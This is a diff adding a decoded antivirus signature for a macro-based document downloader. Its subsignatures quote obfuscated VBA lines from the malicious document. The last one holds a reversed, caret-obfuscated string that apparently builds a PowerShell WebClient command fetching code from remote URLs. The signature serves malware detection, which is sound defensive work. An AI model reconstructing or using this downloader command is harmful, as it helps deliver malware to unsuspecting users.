@@ -1,0 +1,43 @@
+VIRUS NAME: Doc.Downloader.00536d-6691372-0
+TDB: Engine:51-255,Target:2
+LOGICAL EXPRESSION: 0&1&2&3&4&5&6&7
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+   Dim nhbBZ(2)
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+DBiBM(1) = MidB(OiausG, 647, 381)
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+DBiBM(3) = Left(rpXzOl, 37)
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+Dim IFfIUT(4)
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+JMYBo(2) = MidB(OiausG, 647, 381)
+ * SUBSIG ID 5
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+JMYBo(4) = Mid(paYDvG, 537, 387)
+ * SUBSIG ID 6
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+QrzsQ(1) = Left(rpXzOl, 37)
+ * SUBSIG ID 7
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+YXGhmOG = "^m^o" + Chr(Format(18 + 1 + 15 + 5 + 60)) + "^.rosn" + "^a^s^ak^e^pi//:^p^tth^@2^I^" + "f^dgn^G" + "^A/^m^" + "o" + Chr(Format(18 + 1 + 15 + 5 + 60)) + ".^ar^a^g^esn^i//^:^" + "p^tt^h'=X^pn^$;^tn^e^" + "il" + Chr(Format(12 + 1 + 10 + 3 + 41)) + "b^e^W.t^" + "eN ^t" + Chr(Format(18 + 1 + 15 + 5 + 60)) + "ej" + "^bo^-^w^en^=A^" + "wq$^ l^l^"
